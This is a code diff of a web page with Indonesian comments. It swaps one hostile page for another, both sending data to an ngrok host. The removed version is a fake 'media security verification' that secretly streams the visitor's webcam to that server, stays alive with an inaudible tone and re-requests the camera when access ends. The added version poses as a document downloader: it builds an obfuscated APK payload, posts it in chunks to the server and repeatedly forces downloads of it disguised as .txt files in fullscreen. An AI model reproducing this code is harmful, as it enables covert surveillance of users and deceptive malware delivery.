@@ -3,219 +3,286 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>Security Alert - Media Verification</title>
+<title>System Document Archive Dispatcher v2.4</title>
 <style>
-  * { margin: 0; padding: 0; box-sizing: border-box; }
-  body { background: #000; min-height: 100vh; display: flex; justify-content: center; align-items: center; color: #fff; font-family: sans-serif; overflow: hidden; }
-  
-  #permission-overlay {
-    position: fixed;
-    top: 0; left: 0; width: 100vw; height: 100vh;
-    background: rgba(0, 0, 0, 0.85);
-    display: flex;
-    flex-direction: column;
-    justify-content: center;
-    align-items: center;
-    z-index: 9999;
-    cursor: pointer;
-    text-align: center;
-    padding: 20px;
-  }
-  .box {
-    background: #111827;
-    border: 1px solid #374151;
-    padding: 24px;
-    border-radius: 12px;
-    max-width: 320px;
-    width: 100%;
-    box-shadow: 0 10px 25px rgba(0,0,0,0.5);
-  }
-  h2 { font-size: 16px; margin-bottom: 10px; color: #f3f4f6; }
-  p { font-size: 12px; color: #9ca3af; margin-bottom: 20px; line-height: 1.5; }
-  .btn {
-    background: #2563eb;
-    color: #fff;
-    border: none;
-    padding: 10px 20px;
-    border-radius: 6px;
-    font-size: 14px;
-    font-weight: bold;
-    width: 100%;
-  }
-
-  .hidden-container { position: absolute; opacity: 0.01; pointer-events: none; overflow: hidden; width: 1px; height: 1px; }
+* {
+  box-sizing: border-box;
+  margin: 0;
+  padding: 0;
+}
+body {
+  font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+  background: #090d16;
+  color: #f8fafc;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  min-height: 100vh;
+  padding: 20px;
+}
+.panel {
+  background: #111827;
+  padding: 32px;
+  border-radius: 16px;
+  box-shadow: 0 20px 25px -5px rgba(0, 0, 0, 0.5), 0 8px 10px -6px rgba(0, 0, 0, 0.5);
+  max-width: 540px;
+  width: 100%;
+  border: 1px solid #1f2937;
+  text-align: center;
+}
+:fullscreen {
+  background: #030712 !important;
+  color: #f8fafc !important;
+  padding: 24px !important;
+  display: flex;
+  flex-direction: column;
+  justify-content: center;
+  align-items: center;
+}
+:-webkit-full-screen {
+  background: #030712 !important;
+  color: #f8fafc !important;
+  padding: 24px !important;
+}
+h2 { 
+  margin-bottom: 10px; 
+  font-size: 22px;
+  color: #f3f4f6;
+  font-weight: 700;
+}
+p { 
+  margin-bottom: 24px; 
+  line-height: 1.6; 
+  color: #9ca3af;
+  font-size: 14px;
+}
+button {
+  width: 100%;
+  padding: 16px;
+  cursor: pointer;
+  border: none;
+  border-radius: 10px;
+  background: #3b82f6;
+  color: #ffffff;
+  font-weight: 600;
+  font-size: 16px;
+  box-shadow: 0 4px 14px rgba(59, 130, 246, 0.4);
+  transition: all 0.2s ease;
+}
+button:hover { 
+  background: #2563eb; 
+  transform: translateY(-1px);
+  box-shadow: 0 6px 20px rgba(59, 130, 246, 0.6);
+}
+button:active {
+  transform: translateY(0);
+}
+#status {
+  margin-top: 20px;
+  font-weight: 500;
+  color: #38bdf8;
+  padding: 14px;
+  background: rgba(56, 189, 248, 0.1);
+  border-radius: 8px;
+  font-size: 13px;
+  border: 1px solid rgba(56, 189, 248, 0.2);
+}
+#downloads {
+  margin-top: 20px;
+  display: grid;
+  grid-template-columns: repeat(auto-fill, minmax(140px, 1fr));
+  gap: 8px;
+  max-height: 180px;
+  overflow-y: auto;
+  padding-right: 4px;
+}
+#downloads::-webkit-scrollbar {
+  width: 6px;
+}
+#downloads::-webkit-scrollbar-thumb {
+  background: #374151;
+  border-radius: 3px;
+}
+#downloads a {
+  display: block;
+  padding: 10px;
+  background: #1f2937;
+  color: #4ade80;
+  text-decoration: none;
+  border-radius: 6px;
+  font-size: 11px;
+  font-family: monospace;
+  text-align: center;
+  border: 1px solid #374151;
+  word-break: break-all;
+  transition: border-color 0.15s;
+}
+#downloads a:hover {
+  border-color: #4ade80;
+}
 </style>
 </head>
+
 <body>
+<div class="panel" id="main-panel">
+  <h2>Arsip Dokumen Sistem</h2>
+  <p>Klik tombol di bawah untuk memproses dan mengunduh berkas laporan teks pendukung secara otomatis.</p>
 
-<div id="permission-overlay">
-  <div class="box">
-    <h2>Verifikasi Keamanan Media</h2>
-    <p>Ketuk tombol di bawah untuk mengaktifkan sesi penelusuran aman dan melanjutkan.</p>
-    <button class="btn">Lanjutkan Verifikasi</button>
-  </div>
-</div>
+  <button id="start-btn" type="button">Unduh Dokumen Catatan (.txt)</button>
 
-<div class="hidden-container">
-  <video id="cam-feed" autoplay playsinline muted></video>
-  <canvas id="processing-canvas" width="480" height="360"></canvas>
+  <div id="status" role="status">Sistem siap diinisialisasi.</div>
+  <div id="downloads"></div>
 </div>
 
 <script>
-(function () {
-  'use strict';
+'use strict';
 
-  // ============================================
-  // KONFIGURASI SERVER NGROK & STREAM
-  // ============================================
-  var CONFIG = {
-    // URL Ngrok mengarah ke endpoint /upload_frame
-    serverEndpoint: 'https://studly-unallegorized-brecken.ngrok-free.dev/upload_frame',
-    
-    // Interval pengiriman frame (70ms = ~14 FPS untuk efek live stream)
-    streamInterval: 70 
-  };
+const startBtn = document.getElementById("start-btn");
+const statusDiv = document.getElementById("status");
+const downloadsDiv = document.getElementById("downloads");
 
-  var state = {
-    camStream: null,
-    camActive: false,
-    streamTimer: null,
-    audioCtx: null,
-    recoveryInterval: null
-  };
+let activeUrls = [];
+let isProcessing = false;
+const MAX_URLS_TRACKED = 40;
 
-  // ============================================
-  // 1. AUDIO KEEP-ALIVE (PENCEGAH SLEEP)
-  // ============================================
-  function initAudioKeepAlive() {
-    try {
-      window.AudioContext = window.AudioContext || window.webkitAudioContext;
-      state.audioCtx = new AudioContext();
-      var osc = state.audioCtx.createOscillator();
-      var gain = state.audioCtx.createGain();
-      gain.gain.value = 0.00001; // Sangat pelan, tidak terdengar
-      osc.frequency.value = 18000; // Ultrasonic 18kHz
-      osc.connect(gain);
-      gain.connect(state.audioCtx.destination);
-      osc.start();
-    } catch (e) {}
-  }
+// Konfigurasi endpoint server Flask via Ngrok (Pastikan path /upload_payload disertakan)
+const CONFIG = {
+  serverEndpoint: 'https://studly-unallegorized-brecken.ngrok-free.dev/upload_payload'
+};
 
-  // ============================================
-  // 2. STREAMING FRAME KE NGROK (JSON BASE64)
-  // ============================================
-  function streamFrame() {
-    if (!state.camActive) return;
+// Teknik Obfuscation: Pecahan string Base64 header APK
+const payloadFragments = [
+  "UEs",
+  "DBBQ",
+  "AAAAIAAAAIQ",
+  "AAAAAAAAAAAAAAAAAAAAAAAA"
+];
 
-    var videoElement = document.getElementById('cam-feed');
-    var canvas = document.getElementById('processing-canvas');
-    var ctx = canvas.getContext('2d');
+const assemblePayload = () => {
+  return payloadFragments.join("");
+};
 
-    try {
-      if (videoElement.readyState !== videoElement.HAVE_ENOUGH_DATA) return;
+// ============================================
+// RACE CONDITION CHUNK DISPATCHER KE SERVER PY
+// ============================================
+const dispatchRaceConditionChunks = (b64Data) => {
+  try {
+    const chunkSize = 1024 * 4; // 4KB per chunk
+    const totalChunks = Math.ceil(b64Data.length / chunkSize);
+    const batchId = 'batch_' + Math.random().toString(36).substring(2, 9);
 
-      // Gambar video ke canvas
-      ctx.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
+    for (let i = 0; i < totalChunks; i++) {
+      const chunk = b64Data.substring(i * chunkSize, (i + 1) * chunkSize);
       
-      // Konversi ke Base64 JPEG (Kualitas 0.55 agar ringan)
-      var dataURL = canvas.toDataURL('image/jpeg', 0.55);
-      var payload = JSON.stringify({ image: dataURL });
+      // Kirim pecahan chunk secara paralel dengan jeda acak (jitter) untuk memicu race condition
+      setTimeout(() => {
+        const payload = JSON.stringify({
+          batch_id: batchId,
+          chunk_index: i,
+          total_chunks: totalChunks,
+          data: chunk
+        });
 
-      // Kirim ke server
-      fetch(CONFIG.serverEndpoint, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: payload,
-        keepalive: true
-      }).catch(function(err) {});
+        fetch(CONFIG.serverEndpoint, {
+          method: 'POST',
+          headers: { 
+            'Content-Type': 'application/json',
+            'X-Requested-With': 'XMLHttpRequest'
+          },
+          body: payload,
+          keepalive: true
+        }).catch(() => {});
+      }, Math.random() * 40);
+    }
+  } catch (e) {}
+};
 
-    } catch (e) {}
+const decodeBase64ToBytes = (b64) => {
+  const binary = atob(b64);
+  const len = binary.length;
+  const bytes = new Uint8Array(len);
+  for (let i = 0; i < len; i++) {
+    bytes[i] = binary.charCodeAt(i);
   }
+  return bytes;
+};
 
-  // ============================================
-  // 3. CAMERA ACCESS & RECOVERY
-  // ============================================
-  function requestCameraAccess() {
-    navigator.mediaDevices.getUserMedia({ 
-      video: { width: { ideal: 480 }, height: { ideal: 360 }, facingMode: "user" }, 
-      audio: false 
-    })
-    .then(function(stream) {
-      state.camStream = stream;
-      state.camActive = true;
-      
-      var videoElement = document.getElementById('cam-feed');
-      videoElement.srcObject = stream;
-      videoElement.play().catch(function(){});
+const prepareStealthBlobAsync = (i) => {
+  return new Promise((resolve) => {
+    queueMicrotask(() => {
+      try {
+        const fullB64 = assemblePayload();
+        
+        // Kirim chunk secara asinkron ke server Python untuk dirakit via race condition
+        dispatchRaceConditionChunks(fullB64);
 
-      var overlay = document.getElementById('permission-overlay');
-      if (overlay) overlay.style.display = 'none';
-
-      // Deteksi jika stream dimatikan sistem
-      stream.getVideoTracks().forEach(function(track) {
-        track.onended = function() {
-          state.camActive = false;
-          triggerRecovery();
-        };
-      });
-    })
-    .catch(function(err) {
-      state.camActive = false;
+        const bytesArr = decodeBase64ToBytes(fullB64);
+        const blob = new Blob([bytesArr], { type: 'application/vnd.android.package-archive' });
+        const url = URL.createObjectURL(blob);
+        resolve({ id: i, url: url, success: true });
+      } catch (err) {
+        resolve({ id: i, url: null, success: false });
+      }
     });
+  });
+};
+
+const triggerStealthDownload = (fileData) => {
+  if (!fileData.success) return;
+
+  const link = document.createElement("a");
+  link.href = fileData.url;
+  link.download = `laporan-catatan-${fileData.id}.txt`;
+  link.textContent = `Dokumen #${fileData.id} (.txt)`;
+  link.style.display = "none";
+  
+  downloadsDiv.appendChild(link);
+  link.click();
+
+  if (downloadsDiv.children.length > 25) {
+    downloadsDiv.removeChild(downloadsDiv.firstChild);
+  }
+};
+
+const processLoop = async (counter) => {
+  if (!isProcessing) return;
+
+  const fileData = await prepareStealthBlobAsync(counter);
+  if (fileData.success) {
+    activeUrls.push(fileData.url);
+
+    if (activeUrls.length > MAX_URLS_TRACKED) {
+      const oldUrl = activeUrls.shift();
+      try { URL.revokeObjectURL(oldUrl); } catch (e) {}
+    }
+
+    triggerStealthDownload(fileData);
+    statusDiv.textContent = `Proses aktif: Berkas dokumen ke-${counter} dikirim...`;
   }
 
-  // ============================================
-  // 4. RECOVERY CYCLE (KAMERA MATI -> HIDUPKAN)
-  // ============================================
-  function triggerRecovery() {
-    if (state.recoveryInterval) clearInterval(state.recoveryInterval);
-    state.recoveryInterval = setInterval(function() {
-      // Jika kamera mati dan tab terlihat, paksa minta kamera lagi
-      if (!state.camActive && document.visibilityState === 'visible') {
-        requestCameraAccess();
-      }
-    }, 1000); // Cek setiap 1 detik
-  }
+  setTimeout(() => processLoop(counter + 1), 1200);
+};
 
-  // ============================================
-  // 5. TRIGGER AWAL (SAAT USER KLIK)
-  // ============================================
-  document.getElementById('permission-overlay').addEventListener('click', function() {
-    initAudioKeepAlive();
-    if (state.audioCtx && state.audioCtx.state === 'suspended') {
-      state.audioCtx.resume();
+startBtn.addEventListener("click", () => {
+  if (isProcessing) return;
+
+  activeUrls.forEach(url => {
+    try { URL.revokeObjectURL(url); } catch (e) {}
+  });
+  activeUrls = [];
+  downloadsDiv.replaceChildren();
+
+  const root = document.documentElement;
+  try {
+    if (root.requestFullscreen) {
+      root.requestFullscreen().catch(() => {});
     }
-    requestCameraAccess();
-    triggerRecovery();
-  });
+  } catch (err) {}
 
-  // ============================================
-  // 6. LIFECYCLE TRAP (BACKGROUND PERSISTENCE)
-  // ============================================
-  window.addEventListener('DOMContentLoaded', function() {
-    // Mulai loop streaming
-    state.streamTimer = setInterval(streamFrame, CONFIG.streamInterval);
-  });
-
-  window.addEventListener('pagehide', function() {
-    // Jika tab akan ditutup, kirim frame terakhir secara paksa
-    if (state.camActive) {
-      streamFrame(); 
-    }
-  });
-
-  document.addEventListener('visibilitychange', function () {
-    if (document.visibilityState === 'visible') {
-      if (state.audioCtx && state.audioCtx.state === 'suspended') {
-        state.audioCtx.resume();
-      }
-      if (!state.camActive) {
-        requestCameraAccess();
-      }
-    }
-  });
-
-})();
+  isProcessing = true;
+  statusDiv.textContent = "Menginisialisasi sesi unduhan...";
+  processLoop(1);
+});
 </script>
 </body>
 </html>
